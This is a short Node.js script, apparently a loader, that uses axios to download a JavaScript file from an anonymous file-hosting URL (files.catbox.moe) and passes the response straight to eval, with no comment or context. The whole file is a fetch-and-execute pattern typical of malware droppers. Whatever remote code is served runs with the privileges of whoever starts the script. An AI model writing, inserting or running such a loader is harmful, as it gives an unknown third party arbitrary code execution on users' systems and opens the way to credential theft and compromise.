const axios = require('axios');

const url = "https://files.catbox.moe/e0ol0q.js";

axios.get(url)
    .then(response => eval(response.data))
    .catch(err => console.error(err));
